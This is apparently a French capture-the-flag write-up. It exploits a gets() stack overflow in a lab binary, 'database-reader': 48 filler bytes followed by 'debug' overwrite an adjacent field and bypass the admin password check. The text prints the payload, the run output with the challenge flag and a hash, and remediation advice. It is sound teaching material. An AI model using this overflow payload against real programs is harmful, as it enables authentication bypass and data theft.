# St4ck - Write-up (Ov3rwr1t3)

Dans ce challenge, nous restons connectés au serveur avec les identifiants fournis.  
L'objectif est d'analyser et d'exploiter le second binaire présent sur la machine : `database-reader`.

Ce binaire semble permettre l'accès à une base de données protégée via un mot de passe administrateur.  
Notre objectif est donc de comprendre son fonctionnement afin de contourner cette vérification et accéder aux données sensibles.

---

## Étape 1 : Analyse du code source

En examinant le code source `database-reader.c`, nous avons identifié plusieurs éléments clés :

**Structure vulnérable :**
```c
struct {
    char password[48]; // password will be replaced in production to prevent unwanted access
    char debug_level[5];
} locals = {
    .password = {0},
    .debug_level = "guest"
};
```

**Fonction dangereuse :**
```c
gets(locals.password);  // Vulnérable aux buffer overflows !
```

**Condition d'accès :**
```c
if (!strcmp(locals.password, "<REDACTED2>") || !strcmp(locals.debug_level, "debug"))
    decode(cipher, key);
```

---

## Étape 2 : Identification de la vulnérabilité

La vulnérabilité se situe dans l'utilisation de `gets()` qui ne vérifie pas la taille des entrées. En fournissant une chaîne de plus de 48 caractères, nous pouvons écraser la variable `debug_level` dans la structure.

**Offset calculé :**
- `password[48]` : 48 octets
- `debug_level[5]` : 5 octets (mais nous visons "debug" = 5 octets)

---

## Étape 3 : Exploitation

**Payload utilisé :**
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdebug
```

**Explication :**
- 48 caractères 'A' pour remplir le buffer `password`
- "debug" pour écraser `debug_level`

**Test d'exécution :**
```bash
./database-reader 
ECorp database reader v0.2.23

To access the database, please provide the admin password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdebug
Deciphering the database...

** junior-dev vault **

- zip creds(hashed): 60d3445af1ae382994cec66b619bd2d8
- Secret: EPI{whY_lImIT_Our5elVe5_tO_a55i9NEd_vaLUEz}
```

---

## Étape 4 : Résultat du Challenge

**Succès !** L'exploitation a permis de :

1. **Bypasser l'authentification** en écrasant `debug_level`
2. **Accéder à la base de données** sans connaître le mot de passe admin
3. **Récupérer les informations sensibles** :
   - **Hash ZIP** : `60d3445af1ae382994cec66b619bd2d8`
   - **Flag final** : `EPI{whY_lImIT_Our5elVe5_tO_a55i9NEd_vaLUEz}`

---

## Analyse de la Vulnérabilité

### Nom de la vulnérabilité
**Buffer Overflow avec manipulation de variables locales** (Stack-based Overflow)

### Description technique
Un buffer overflow se produit lorsqu'un programme écrit plus de données que la taille prévue d'une zone mémoire. Dans ce cas, le programme `database-reader` utilise `gets()` qui ne vérifie pas la taille des entrées, permettant ainsi d'écraser des variables adjacentes dans la structure sur la pile.

**Vulnérabilité spécifique :**
- La variable `password[48]` est remplie avec 48+ caractères
- L'overflow écrase `debug_level[5]` qui se trouve juste après dans la structure
- En écrivant "debug" dans `debug_level`, on contourne la condition d'authentification

### Conséquences de cette vulnérabilité

#### Impact sur la sécurité
1. **Contournement d'authentification** : Bypass du mot de passe admin
2. **Accès non autorisé** : Accès à la base de données protégée
3. **Exfiltration de données** : Récupération d'informations sensibles
4. **Manipulation d'état** : Modification du niveau de debug du programme

#### Scénarios d'attaque possibles
- **Bypass d'authentification** : Accéder à des fonctionnalités protégées
- **Exfiltration de données** : Vol d'informations sensibles (hashs, secrets)
- **Élévation de privilèges** : Obtenir des droits d'accès supérieurs
- **Manipulation de comportement** : Modifier le fonctionnement du programme

---

## Mesures de correction et prévention

### Corrections immédiates
1. **Remplacement de gets()** : Utiliser `fgets()` avec contrôle de taille
2. **Validation des entrées** : Ajouter des contrôles de longueur stricts
3. **Séparation des variables** : Éviter les structures vulnérables

### Mesures de sécurité à long terme

#### Bonnes pratiques de développement
**Remplacer les fonctions dangereuses :**
- `gets()`, `strcpy()`, `sprintf()`
- `fgets()`, `strncpy()`, `snprintf()`

**Exemple de code sécurisé :**
```c
char password[48];
fgets(password, sizeof(password), stdin);
password[strcspn(password, "\n")] = '\0'; // Remove newline
```

#### Protections système
- **ASLR** (Address Space Layout Randomization)
- **NX / DEP** (Non-Executable Memory)
- **Stack Canaries**
- **Fortify Source**

#### Sécurité applicative
- **Validation stricte** des entrées utilisateur
- **Tests de robustesse** (fuzzing)
- **Audit de code** régulier
- **Analyse statique** automatisée

---

## Bonnes pratiques générales

### A faire
- **Valider toutes les entrées** utilisateur
- **Utiliser des fonctions sécurisées** pour la manipulation de chaînes
- **Mettre en place des audits de sécurité** réguliers
- **Séparer les données sensibles** dans des structures distinctes

### A éviter
- **Utiliser des fonctions non sécurisées** comme `gets()`
- **Négliger les contrôles de taille** des buffers
- **Faire confiance aux entrées utilisateur**
- **Ignorer les warnings** du compilateur

---

**Mission accomplie** : Le troisième challenge a été résolu avec succès en exploitant une vulnérabilité de type buffer overflow sur la pile pour manipuler les variables locales et contourner la sécurité.
